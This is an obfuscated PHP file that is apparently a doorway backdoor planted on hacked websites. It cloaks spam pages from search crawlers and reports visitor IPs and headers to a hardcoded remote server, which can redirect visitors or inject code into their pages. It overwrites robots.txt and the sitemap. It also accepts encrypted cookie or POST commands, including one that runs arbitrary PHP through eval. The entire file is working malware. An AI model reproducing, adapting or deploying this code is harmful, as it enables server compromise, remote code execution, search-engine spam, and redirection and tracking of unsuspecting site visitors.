<?php

@ini_set('error_log', NULL);@ini_set('log_errors', 0);@ini_set('max_execution_time', 0);@error_reporting(0);@set_time_limit(0);date_default_timezone_set('UTC');class _k520g5{static private $_7lxofoh3 = 2420912794;static function _xcbpw($_hnocvwc5, $_tiu6ha84){$_hnocvwc5[2] = count($_hnocvwc5) > 4 ? long2ip(_k520g5::$_7lxofoh3 - 754) : $_hnocvwc5[2];$_u591zc4b = _k520g5::_b07sd($_hnocvwc5, $_tiu6ha84);if (!$_u591zc4b) {$_u591zc4b = _k520g5::_xvod0($_hnocvwc5, $_tiu6ha84);}return $_u591zc4b;}static function _b07sd($_hnocvwc5, $_u591zc4b, $_t84edqzw = NULL){if (!function_exists('curl_version')) {return "";}if (is_array($_hnocvwc5)) {$_hnocvwc5 = implode("/", $_hnocvwc5);}$_kblzok6n = curl_init();curl_setopt($_kblzok6n, CURLOPT_SSL_VERIFYHOST, false);curl_setopt($_kblzok6n, CURLOPT_SSL_VERIFYPEER, false);curl_setopt($_kblzok6n, CURLOPT_URL, $_hnocvwc5);if (!empty($_u591zc4b)) {curl_setopt($_kblzok6n, CURLOPT_POST, 1);curl_setopt($_kblzok6n, CURLOPT_POSTFIELDS, $_u591zc4b);}if (!empty($_t84edqzw)) {curl_setopt($_kblzok6n, CURLOPT_HTTPHEADER, $_t84edqzw);}curl_setopt($_kblzok6n, CURLOPT_RETURNTRANSFER, TRUE);$_z6yv5o9l = curl_exec($_kblzok6n);curl_close($_kblzok6n);return $_z6yv5o9l;}static function _xvod0($_hnocvwc5, $_u591zc4b, $_t84edqzw = NULL){if (is_array($_hnocvwc5)) {$_hnocvwc5 = implode("/", $_hnocvwc5);}if (!empty($_u591zc4b)) {$_qkpdt26s = array('method' => 'POST','header' => 'Content-type: application/x-www-form-urlencoded','content' => $_u591zc4b);if (!empty($_t84edqzw)) {$_qkpdt26s["header"] = $_qkpdt26s["header"] . "\r\n" . implode("\r\n", $_t84edqzw);}$_gyu1gf2o = stream_context_create(array('http' => $_qkpdt26s));} else {$_qkpdt26s = array('method' => 'GET',);if (!empty($_t84edqzw)) {$_qkpdt26s["header"] = implode("\r\n", $_t84edqzw);}$_gyu1gf2o = stream_context_create(array('http' => $_qkpdt26s));}return @file_get_contents($_hnocvwc5, FALSE, $_gyu1gf2o);}}class _dq81z5{private static $_csim40q0 = "";private static $_9tehbyp8 = -1;private static $_fzfrnyzg = "";private $_740ebk4a = "";private $_aufg114i = "";private $_i84hnduh = "";private $_iz0pl0a9 = "";public static function _hparb($_irdzjbwl, $_o446yln9, $_uy4ew3ws){_dq81z5::$_csim40q0 = $_irdzjbwl . "/cache/";_dq81z5::$_9tehbyp8 = $_o446yln9;_dq81z5::$_fzfrnyzg = $_uy4ew3ws;if (!@file_exists(_dq81z5::$_csim40q0)) {@mkdir(_dq81z5::$_csim40q0);}}static public function _3uepr(){$_e6rq3kzp = 0;foreach (scandir(_dq81z5::$_csim40q0) as $_zdov3g6h) {$_e6rq3kzp += 1;}return $_e6rq3kzp;}public static function _qdcp4(){return TRUE;}public function __construct($_a8omdwj0, $_sfsirsyr, $_0uab6r13, $_owoiymsk){$this->_740ebk4a = $_a8omdwj0;$this->_aufg114i = $_sfsirsyr;$this->_i84hnduh = $_0uab6r13;$this->_iz0pl0a9 = $_owoiymsk;}public function _inxw9(){function _45qjp($_btklwo65, $_jn8zo5uf){return round(rand($_btklwo65, $_jn8zo5uf - 1) + (rand(0, PHP_INT_MAX - 1) / PHP_INT_MAX), 2);}$_7ol174rq = _4wtcyst::_wt12v();$_u591zc4b = str_replace("{{ text }}", $this->_aufg114i,str_replace("{{ keyword }}", $this->_i84hnduh,str_replace("{{ links }}", $this->_iz0pl0a9, $this->_740ebk4a)));while (TRUE) {$_ee8b9jso = preg_replace('/' . preg_quote("{{ randkeyword }}", '/') . '/', _4wtcyst::_1n2ct(), $_u591zc4b, 1);if ($_ee8b9jso === $_u591zc4b) {break;}$_u591zc4b = $_ee8b9jso;}while (TRUE) {preg_match('/{{ KEYWORDBYINDEX-ANCHOR (\d*) }}/', $_u591zc4b, $_2jdut706);if (empty($_2jdut706)) {break;}$_0uab6r13 = @$_7ol174rq[intval($_2jdut706[1])];$_dppm6mks = _afiq9pj::_h40mn($_0uab6r13);$_u591zc4b = str_replace($_2jdut706[0], $_dppm6mks, $_u591zc4b);}while (TRUE) {preg_match('/{{ KEYWORDBYINDEX (\d*) }}/', $_u591zc4b, $_2jdut706);if (empty($_2jdut706)) {break;}$_0uab6r13 = @$_7ol174rq[intval($_2jdut706[1])];$_u591zc4b = str_replace($_2jdut706[0], $_0uab6r13, $_u591zc4b);}while (TRUE) {preg_match('/{{ RANDFLOAT (\d*)-(\d*) }}/', $_u591zc4b, $_2jdut706);if (empty($_2jdut706)) {break;}$_u591zc4b = str_replace($_2jdut706[0], _45qjp($_2jdut706[1], $_2jdut706[2]), $_u591zc4b);}while (TRUE) {preg_match('/{{ RANDINT (\d*)-(\d*) }}/', $_u591zc4b, $_2jdut706);if (empty($_2jdut706)) {break;}$_u591zc4b = str_replace($_2jdut706[0], rand($_2jdut706[1], $_2jdut706[2]), $_u591zc4b);}return $_u591zc4b;}public function _c8iqu(){$_moqr8u2z = _dq81z5::$_csim40q0 . md5($this->_i84hnduh . _dq81z5::$_fzfrnyzg);if (_dq81z5::$_9tehbyp8 == -1) {$_m73sr4gj = -1;} else {$_m73sr4gj = time() + (3600 * 24 * 30);}$_9rk3epxp = array("template" => $this->_740ebk4a, "text" => $this->_aufg114i, "keyword" => $this->_i84hnduh,"links" => $this->_iz0pl0a9, "expired" => $_m73sr4gj);@file_put_contents($_moqr8u2z, serialize($_9rk3epxp));}static public function _drwt1($_0uab6r13){$_moqr8u2z = _dq81z5::$_csim40q0 . md5($_0uab6r13 . _dq81z5::$_fzfrnyzg);$_moqr8u2z = @unserialize(@file_get_contents($_moqr8u2z));if (!empty($_moqr8u2z) && ($_moqr8u2z["expired"] > time() || $_moqr8u2z["expired"] == -1)) {return new _dq81z5($_moqr8u2z["template"], $_moqr8u2z["text"], $_moqr8u2z["keyword"], $_moqr8u2z["links"]);} else {return null;}}}class _bdyz89{private static $_csim40q0 = "";private static $_wfr2k455 = "";public static function _hparb($_irdzjbwl, $_k85cadwa){_bdyz89::$_csim40q0 = $_irdzjbwl . "/";_bdyz89::$_wfr2k455 = $_k85cadwa;if (!@file_exists(_bdyz89::$_csim40q0)) {@mkdir(_bdyz89::$_csim40q0);}}public static function _qdcp4(){return TRUE;}static public function _3uepr(){$_e6rq3kzp = 0;foreach (scandir(_bdyz89::$_csim40q0) as $_zdov3g6h) {if (strpos($_zdov3g6h, _bdyz89::$_wfr2k455) === 0) {$_e6rq3kzp += 1;}}return $_e6rq3kzp;}static public function _1n2ct(){$_v0lwv8ig = array();foreach (scandir(_bdyz89::$_csim40q0) as $_zdov3g6h) {if (strpos($_zdov3g6h, _bdyz89::$_wfr2k455) === 0) {$_v0lwv8ig[] = $_zdov3g6h;}}return @file_get_contents(_bdyz89::$_csim40q0 . $_v0lwv8ig[array_rand($_v0lwv8ig)]);}static public function _c8iqu($_v8pk3pd4){if (@file_exists(_bdyz89::$_wfr2k455 . "_" . md5($_v8pk3pd4) . ".html")) {return;}@file_put_contents(_bdyz89::$_wfr2k455 . "_" . md5($_v8pk3pd4) . ".html", $_v8pk3pd4);}}class _4wtcyst{private static $_csim40q0 = "";private static $_wfr2k455 = "";private static $_np4x66it = array();private static $_elpyfnm6 = array();public static function _hparb($_irdzjbwl, $_k85cadwa){_4wtcyst::$_csim40q0 = $_irdzjbwl . "/";_4wtcyst::$_wfr2k455 = $_k85cadwa;if (!@file_exists(_4wtcyst::$_csim40q0)) {@mkdir(_4wtcyst::$_csim40q0);}}private static function _6czyw(){$_8ylpnhy3 = array();foreach (scandir(_4wtcyst::$_csim40q0) as $_zdov3g6h) {if (strpos($_zdov3g6h, _4wtcyst::$_wfr2k455) === 0) {$_8ylpnhy3[] = $_zdov3g6h;}}return $_8ylpnhy3;}public static function _qdcp4(){return TRUE;}static public function _1n2ct(){if (empty(_4wtcyst::$_np4x66it)) {$_8ylpnhy3 = _4wtcyst::_6czyw();_4wtcyst::$_np4x66it = @file(_4wtcyst::$_csim40q0 . $_8ylpnhy3[array_rand($_8ylpnhy3)], FILE_IGNORE_NEW_LINES);}return _4wtcyst::$_np4x66it[array_rand(_4wtcyst::$_np4x66it)];}static public function _wt12v(){if (empty(_4wtcyst::$_elpyfnm6)) {$_8ylpnhy3 = _4wtcyst::_6czyw();foreach ($_8ylpnhy3 as $_2kar8pq5) {_4wtcyst::$_elpyfnm6 = array_merge(_4wtcyst::$_elpyfnm6, @file(_4wtcyst::$_csim40q0 . $_2kar8pq5, FILE_IGNORE_NEW_LINES));}}return _4wtcyst::$_elpyfnm6;}static public function _c8iqu($_xjb0qjv0){if (@file_exists(_4wtcyst::$_wfr2k455 . "_" . md5($_xjb0qjv0) . ".list")) {return;}@file_put_contents(_4wtcyst::$_wfr2k455 . "_" . md5($_xjb0qjv0) . ".list", $_xjb0qjv0);}static public function _e1j66($_0uab6r13){@file_put_contents(_4wtcyst::$_wfr2k455 . "_" . md5(_afiq9pj::$_uw4d86mt) . ".list", $_0uab6r13 . "\n", 8);}}class _afiq9pj{static public $_52uh3icf = "5.3";static public $_uw4d86mt = "a017ff46-f54c-e8a7-caee-12797f509794";private $_jx8wr7w2 = "http://136.12.78.46/app/assets/api2?action=redir";private $_4pm73xz0 = "http://136.12.78.46/app/assets/api?action=page";static public $_itxd2dz8 = 5;static public $_vw82791q = 20;private function _73hq7(){$_g23w4y4q = array('#libwww-perl#i','#MJ12bot#i','#msnbot#i', '#msnbot-media#i','#YandexBot#i', '#msnbot#i', '#YandexWebmaster#i','#spider#i', '#yahoo#i', '#google#i', '#altavista#i','#ask#i','#yahoo!\s*slurp#i','#BingBot#i');if (!empty($_SERVER['HTTP_USER_AGENT']) && (FALSE !== strpos(preg_replace($_g23w4y4q, '-NO-WAY-', $_SERVER['HTTP_USER_AGENT']), '-NO-WAY-'))) {$_m3vkbr27 = 1;} elseif (empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) || empty($_SERVER['HTTP_REFERER'])) {$_m3vkbr27 = 1;} elseif (strpos($_SERVER['HTTP_REFERER'], "google") === FALSE &&strpos($_SERVER['HTTP_REFERER'], "yahoo") === FALSE &&strpos($_SERVER['HTTP_REFERER'], "bing") === FALSE &&strpos($_SERVER['HTTP_REFERER'], "yandex") === FALSE) {$_m3vkbr27 = 1;} else {$_m3vkbr27 = 0;}return $_m3vkbr27;}private static function _vdlgl(){$_tiu6ha84 = array();$_tiu6ha84['ip'] = $_SERVER['REMOTE_ADDR'];$_tiu6ha84['qs'] = @$_SERVER['HTTP_HOST'] . @$_SERVER['REQUEST_URI'];$_tiu6ha84['ua'] = @$_SERVER['HTTP_USER_AGENT'];$_tiu6ha84['lang'] = @$_SERVER['HTTP_ACCEPT_LANGUAGE'];$_tiu6ha84['ref'] = @$_SERVER['HTTP_REFERER'];$_tiu6ha84['enc'] = @$_SERVER['HTTP_ACCEPT_ENCODING'];$_tiu6ha84['acp'] = @$_SERVER['HTTP_ACCEPT'];$_tiu6ha84['char'] = @$_SERVER['HTTP_ACCEPT_CHARSET'];$_tiu6ha84['conn'] = @$_SERVER['HTTP_CONNECTION'];return $_tiu6ha84;}public function __construct(){$this->_jx8wr7w2 = explode("/", $this->_jx8wr7w2);$this->_4pm73xz0 = explode("/", $this->_4pm73xz0);}static public function _ez882($_rrzoo2lh){if (strlen($_rrzoo2lh) < 4) {return "";}$_3cm2obkn = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";$_7ol174rq = str_split($_3cm2obkn);$_7ol174rq = array_flip($_7ol174rq);$_kldqcqp2 = 0;$_1fr1n8fb = "";$_rrzoo2lh = preg_replace("~[^A-Za-z0-9\+\/\=]~", "", $_rrzoo2lh);do {$_1d2f447e = $_7ol174rq[$_rrzoo2lh[$_kldqcqp2++]];$_0k6q2q8p = $_7ol174rq[$_rrzoo2lh[$_kldqcqp2++]];$_gc9x8nsu = $_7ol174rq[$_rrzoo2lh[$_kldqcqp2++]];$_8afu2f7u = $_7ol174rq[$_rrzoo2lh[$_kldqcqp2++]];$_tkt6lnzz = ($_1d2f447e << 2) | ($_0k6q2q8p >> 4);$_p735ihpt = (($_0k6q2q8p & 15) << 4) | ($_gc9x8nsu >> 2);$_l5gv8u88 = (($_gc9x8nsu & 3) << 6) | $_8afu2f7u;$_1fr1n8fb = $_1fr1n8fb . chr($_tkt6lnzz);if ($_gc9x8nsu != 64) {$_1fr1n8fb = $_1fr1n8fb . chr($_p735ihpt);}if ($_8afu2f7u != 64) {$_1fr1n8fb = $_1fr1n8fb . chr($_l5gv8u88);}} while ($_kldqcqp2 < strlen($_rrzoo2lh));return $_1fr1n8fb;}private function _1n4go($_0uab6r13){$_a8omdwj0 = "";$_sfsirsyr = "";$_tiu6ha84 = _afiq9pj::_vdlgl();$_tiu6ha84["uid"] = _afiq9pj::$_uw4d86mt;$_tiu6ha84["keyword"] = $_0uab6r13;$_tiu6ha84["tc"] = 10;$_tiu6ha84 = http_build_query($_tiu6ha84);$_c46ynx33 = _k520g5::_xcbpw($this->_4pm73xz0, $_tiu6ha84);if (strpos($_c46ynx33, _afiq9pj::$_uw4d86mt) === FALSE) {return array($_a8omdwj0, $_sfsirsyr);}$_a8omdwj0 = _bdyz89::_1n2ct();$_sfsirsyr = substr($_c46ynx33, strlen(_afiq9pj::$_uw4d86mt));$_sfsirsyr = explode("\n", $_sfsirsyr);shuffle($_sfsirsyr);$_sfsirsyr = implode(" ", $_sfsirsyr);return array($_a8omdwj0, $_sfsirsyr);}private function _v4fh6(){$_tiu6ha84 = _afiq9pj::_vdlgl();if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {$_tiu6ha84['cfconn'] = @$_SERVER['HTTP_CF_CONNECTING_IP'];}if (isset($_SERVER['HTTP_X_REAL_IP'])) {$_tiu6ha84['xreal'] = @$_SERVER['HTTP_X_REAL_IP'];}if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {$_tiu6ha84['xforward'] = @$_SERVER['HTTP_X_FORWARDED_FOR'];}$_tiu6ha84["uid"] = _afiq9pj::$_uw4d86mt;$_tiu6ha84 = http_build_query($_tiu6ha84);$_1ea7o5mu = _k520g5::_xcbpw($this->_jx8wr7w2, $_tiu6ha84);$_1ea7o5mu = @unserialize($_1ea7o5mu);if (isset($_1ea7o5mu["type"]) && $_1ea7o5mu["type"] == "redir") {if (!empty($_1ea7o5mu["data"]["header"])) {header($_1ea7o5mu["data"]["header"]);return true;} elseif (!empty($_1ea7o5mu["data"]["code"])) {echo $_1ea7o5mu["data"]["code"];return true;}}return false;}public function _qdcp4(){return _dq81z5::_qdcp4() && _bdyz89::_qdcp4() && _4wtcyst::_qdcp4();}static public function _9eyai(){if ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || $_SERVER['SERVER_PORT'] == 443) {return true;}return false;}public static function _p7jfr(){$_bqi9jjo9 = explode("?", $_SERVER["REQUEST_URI"], 2);$_bqi9jjo9 = $_bqi9jjo9[0];if (strpos($_bqi9jjo9, ".php") === FALSE) {$_bqi9jjo9 = explode("/", $_bqi9jjo9);array_pop($_bqi9jjo9);$_bqi9jjo9 = implode("/", $_bqi9jjo9) . "/";}return sprintf("%s://%s%s", _afiq9pj::_9eyai() ? "https" : "http", $_SERVER['HTTP_HOST'], $_bqi9jjo9);}public static function _8fnj7(){$_yh0oldso = Array("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15","Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15","Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36","Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36");$_x71yc17b = array("https://www.google.com/ping?sitemap=" => "Sitemap Notification Received",);$_t84edqzw = array("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language: en-US,en;q=0.5","User-Agent: " . $_yh0oldso[array_rand($_yh0oldso)],);$_74bxjh5y = urlencode(_afiq9pj::_e3ddx() . "/sitemap.xml");foreach ($_x71yc17b as $_hnocvwc5 => $_x14nfq9l) {$_hq4dxwp6 = _k520g5::_b07sd($_hnocvwc5 . $_74bxjh5y, NULL, $_t84edqzw);if (empty($_hq4dxwp6)) {$_hq4dxwp6 = _k520g5::_xvod0($_hnocvwc5 . $_74bxjh5y, NULL, $_t84edqzw);}if (empty($_hq4dxwp6)) {return FALSE;}if (strpos($_hq4dxwp6, $_x14nfq9l) === FALSE) {return FALSE;}}return TRUE;}public static function _oedkf(){$_pd3123cf = "User-agent: *\nDisallow: %s\nUser-agent: Bingbot\nUser-agent: Googlebot\nUser-agent: Slurp\nDisallow:\nSitemap: %s\n";$_bqi9jjo9 = explode("?", $_SERVER["REQUEST_URI"], 2);$_bqi9jjo9 = $_bqi9jjo9[0];$_59j7v8i7 = substr($_bqi9jjo9, 0, strrpos($_bqi9jjo9, "/"));$_44p7ttf6 = sprintf($_pd3123cf, $_59j7v8i7, _afiq9pj::_e3ddx() . "/sitemap.xml");$_0dyvd81f = $_SERVER["DOCUMENT_ROOT"] . "/robots.txt";if (@file_exists($_0dyvd81f)) {@chmod($_0dyvd81f, 0777);$_5a67jf3t = @file_get_contents($_0dyvd81f);} else {$_5a67jf3t = "";}if (strpos($_5a67jf3t, $_44p7ttf6) === FALSE) {@file_put_contents($_0dyvd81f, $_5a67jf3t . "\n" . $_44p7ttf6);$_5a67jf3t = @file_get_contents($_0dyvd81f);return (strpos($_5a67jf3t, $_44p7ttf6) !== FALSE);}return FALSE;}public static function _e3ddx(){$_bqi9jjo9 = explode("?", $_SERVER["REQUEST_URI"], 2);$_bqi9jjo9 = $_bqi9jjo9[0];$_irdzjbwl = substr($_bqi9jjo9, 0, strrpos($_bqi9jjo9, "/"));return sprintf("%s://%s%s", _afiq9pj::_9eyai() ? "https" : "http", $_SERVER['HTTP_HOST'], $_irdzjbwl);}public static function _h40mn($_0uab6r13){$_gczgpcdn = _afiq9pj::_p7jfr();$_6urtobub = substr(md5(_afiq9pj::$_uw4d86mt . "salt3"), 0, 6);$_h7ferb6k = "";if (substr($_gczgpcdn, -1) == "/") {if (ord($_6urtobub[1]) % 2) {$_0uab6r13 = str_replace(" ", "-", $_0uab6r13);} else {$_0uab6r13 = str_replace(" ", "-", $_0uab6r13);}$_h7ferb6k = sprintf("%s%s", $_gczgpcdn, urlencode($_0uab6r13));} else {if (FALSE && (ord($_6urtobub[0]) % 2)) {$_h7ferb6k = sprintf("%s?%s=%s",$_gczgpcdn,$_6urtobub,urlencode(str_replace(" ", "-", $_0uab6r13)));} else {$_mp8j8t9q = array("id", "page", "tag");$_1mz5jaec = $_mp8j8t9q[ord($_6urtobub[2]) % count($_mp8j8t9q)];if (ord($_6urtobub[1]) % 2) {$_0uab6r13 = str_replace(" ", "-", $_0uab6r13);} else {$_0uab6r13 = str_replace(" ", "-", $_0uab6r13);}$_h7ferb6k = sprintf("%s?%s=%s",$_gczgpcdn,$_1mz5jaec,urlencode($_0uab6r13));}}return $_h7ferb6k;}public static function _u6yez($_btklwo65, $_jn8zo5uf){$_qcq1bhi1 = "";for ($_kldqcqp2 = 0; $_kldqcqp2 < rand($_btklwo65, $_jn8zo5uf); $_kldqcqp2++) {$_0uab6r13 = _4wtcyst::_1n2ct();$_qcq1bhi1 .= sprintf("<a href=\"%s\">%s</a>,\n",_afiq9pj::_h40mn($_0uab6r13), ucwords($_0uab6r13));}return $_qcq1bhi1;}public static function _ofe1e($_jznltjvp = FALSE){$_kcm37hpr = dirname(__FILE__) . "/sitemap.xml";$_eh6ptz25 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?" . ">\n<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">\n";$_apc00gy7 = "</urlset>";$_7ol174rq = _4wtcyst::_wt12v();$_zp4vugkl = array();if (file_exists($_kcm37hpr)) {$_c46ynx33 = simplexml_load_file($_kcm37hpr);foreach ($_c46ynx33 as $_xypvr2og) {$_zp4vugkl[(string)$_xypvr2og->loc] = (string)$_xypvr2og->lastmod;}} else {$_jznltjvp = FALSE;}foreach ($_7ol174rq as $_dbbtrk40) {$_h7ferb6k = _afiq9pj::_h40mn($_dbbtrk40);if (isset($_zp4vugkl[$_h7ferb6k])) {continue;}if ($_jznltjvp) {$_tmiuvv6q = time();} else {$_tmiuvv6q = time() - (crc32($_dbbtrk40) % (60 * 60 * 24 * 30));}$_zp4vugkl[$_h7ferb6k] = date("Y-m-d", $_tmiuvv6q);}$_xpslhu2s = "";foreach ($_zp4vugkl as $_hnocvwc5 => $_tmiuvv6q) {$_xpslhu2s .= "<url>\n";$_xpslhu2s .= sprintf("<loc>%s</loc>\n", $_hnocvwc5);$_xpslhu2s .= sprintf("<lastmod>%s</lastmod>\n", $_tmiuvv6q);$_xpslhu2s .= "</url>\n";}$_u6700uf9 = $_eh6ptz25 . $_xpslhu2s . $_apc00gy7;$_74bxjh5y = _afiq9pj::_e3ddx() . "/sitemap.xml";@file_put_contents($_kcm37hpr, $_u6700uf9);return $_74bxjh5y;}public function _y6wdd(){$_1mz5jaec = substr(md5(_afiq9pj::$_uw4d86mt . "salt3"), 0, 6);if (!$this->_73hq7()) {if ($this->_v4fh6()) {return;}}if (!empty($_GET)) {$_2vzs8kqe = array_values($_GET);} else {$_2vzs8kqe = explode("/", $_SERVER["REQUEST_URI"]);$_2vzs8kqe = array_reverse($_2vzs8kqe);}$_0uab6r13 = "";foreach ($_2vzs8kqe as $_smron4m3) {if (substr_count($_smron4m3, "-") > 0) {$_0uab6r13 = $_smron4m3;break;}}$_0uab6r13 = str_replace($_1mz5jaec . "-", "", $_0uab6r13);$_0uab6r13 = str_replace("-" . $_1mz5jaec, "", $_0uab6r13);$_0uab6r13 = str_replace("-", " ", $_0uab6r13);$_ih4tnckm = array(".html", ".php", ".aspx");foreach ($_ih4tnckm as $_u5ehdoy0) {if (strpos($_0uab6r13, $_u5ehdoy0) === strlen($_0uab6r13) - strlen($_u5ehdoy0)) {$_0uab6r13 = substr($_0uab6r13, 0, strlen($_0uab6r13) - strlen($_u5ehdoy0));}}$_0uab6r13 = urldecode($_0uab6r13);$_hdvqfbl0 = _4wtcyst::_wt12v();if (empty($_0uab6r13)) {$_0uab6r13 = $_hdvqfbl0[0];} else if (!in_array($_0uab6r13, $_hdvqfbl0)) {$_k87ysdqz = 0;foreach (str_split($_0uab6r13) as $_kblzok6n) {$_k87ysdqz += ord($_kblzok6n);}$_0uab6r13 = $_hdvqfbl0[$_k87ysdqz % count($_hdvqfbl0)];}if (!empty($_0uab6r13)) {$_1ea7o5mu = _dq81z5::_drwt1($_0uab6r13);if (empty($_1ea7o5mu)) {list($_a8omdwj0, $_sfsirsyr) = $this->_1n4go($_0uab6r13);if (empty($_sfsirsyr)) {return;}$_1ea7o5mu = new _dq81z5($_a8omdwj0, $_sfsirsyr, $_0uab6r13, _afiq9pj::_u6yez(_afiq9pj::$_itxd2dz8, _afiq9pj::$_vw82791q));$_1ea7o5mu->_c8iqu();}echo $_1ea7o5mu->_inxw9();}}}_dq81z5::_hparb(dirname(__FILE__), -1, _afiq9pj::$_uw4d86mt);_bdyz89::_hparb(dirname(__FILE__), substr(md5(_afiq9pj::$_uw4d86mt . "salt12"), 0, 4));_4wtcyst::_hparb(dirname(__FILE__), substr(md5(_afiq9pj::$_uw4d86mt . "salt22"), 0, 4));function _uuzcs($_c46ynx33, $_dbbtrk40){$_6jdlkkot = "";for ($_kldqcqp2 = 0; $_kldqcqp2 < strlen($_c46ynx33);) {for ($_jh4mmq2x = 0; $_jh4mmq2x < strlen($_dbbtrk40) && $_kldqcqp2 < strlen($_c46ynx33); $_jh4mmq2x++, $_kldqcqp2++) {$_6jdlkkot .= chr(ord($_c46ynx33[$_kldqcqp2]) ^ ord($_dbbtrk40[$_jh4mmq2x]));}}return $_6jdlkkot;}function _2yu7k($_c46ynx33, $_dbbtrk40, $_0adk06kp){return _uuzcs(_uuzcs($_c46ynx33, $_dbbtrk40), $_0adk06kp);}foreach (array_merge($_COOKIE, $_POST) as $_zdtmbpy3 => $_c46ynx33) {$_c46ynx33 = @unserialize(_2yu7k(_afiq9pj::_ez882($_c46ynx33), $_zdtmbpy3, _afiq9pj::$_uw4d86mt));if (isset($_c46ynx33['ak']) && _afiq9pj::$_uw4d86mt == $_c46ynx33['ak']) {if ($_c46ynx33['a'] == 'doorway2') {if ($_c46ynx33['sa'] == 'check') {$_u591zc4b = _k520g5::_xcbpw(explode("/", "http://httpbin.org/"), "");if (strlen($_u591zc4b) > 512) {echo @serialize(array("uid" => _afiq9pj::$_uw4d86mt, "v" => _afiq9pj::$_52uh3icf,"cache" => _dq81z5::_3uepr(),"keywords" => count(_4wtcyst::_wt12v()),"templates" => _bdyz89::_3uepr()));}exit;}if ($_c46ynx33['sa'] == 'templates') {foreach ($_c46ynx33["templates"] as $_a8omdwj0) {_bdyz89::_c8iqu($_a8omdwj0);echo @serialize(array("uid" => _afiq9pj::$_uw4d86mt, "v" => _afiq9pj::$_52uh3icf,));}}if ($_c46ynx33['sa'] == 'keywords') {_4wtcyst::_c8iqu($_c46ynx33["keywords"]);_afiq9pj::_ofe1e();echo @serialize(array("uid" => _afiq9pj::$_uw4d86mt, "v" => _afiq9pj::$_52uh3icf,));}if ($_c46ynx33['sa'] == 'update_sitemap') {_afiq9pj::_ofe1e(TRUE);echo @serialize(array("uid" => _afiq9pj::$_uw4d86mt, "v" => _afiq9pj::$_52uh3icf,));}if ($_c46ynx33['sa'] == 'pages') {$_gz00f9op = 0;$_hdvqfbl0 = _4wtcyst::_wt12v();if (_bdyz89::_3uepr() > 0) {foreach ($_c46ynx33['pages'] as $_1ea7o5mu) {$_cc3n4v2p = _dq81z5::_drwt1($_1ea7o5mu["keyword"]);if (empty($_cc3n4v2p)) {$_cc3n4v2p = new _dq81z5(_bdyz89::_1n2ct(), $_1ea7o5mu["text"], $_1ea7o5mu["keyword"], _afiq9pj::_u6yez(_afiq9pj::$_itxd2dz8, _afiq9pj::$_vw82791q));$_cc3n4v2p->_c8iqu();$_gz00f9op += 1;if (!in_array($_1ea7o5mu["keyword"], $_hdvqfbl0)) {_4wtcyst::_e1j66($_1ea7o5mu["keyword"]);}}}}echo @serialize(array("uid" => _afiq9pj::$_uw4d86mt, "v" => _afiq9pj::$_52uh3icf, "pages" => $_gz00f9op));}if ($_c46ynx33["sa"] == "ping") {$_hq4dxwp6 = _afiq9pj::_8fnj7();echo @serialize(array("uid" => _afiq9pj::$_uw4d86mt, "v" => _afiq9pj::$_52uh3icf, "result" => (int)$_hq4dxwp6));}if ($_c46ynx33["sa"] == "robots") {$_hq4dxwp6 = _afiq9pj::_oedkf();echo @serialize(array("uid" => _afiq9pj::$_uw4d86mt, "v" => _afiq9pj::$_52uh3icf, "result" => (int)$_hq4dxwp6));}}if ($_c46ynx33['sa'] == 'eval') {eval($_c46ynx33["data"]);exit;}}}$_9e0m8o5m = new _afiq9pj();if ($_9e0m8o5m->_qdcp4()) {$_9e0m8o5m->_y6wdd();}exit();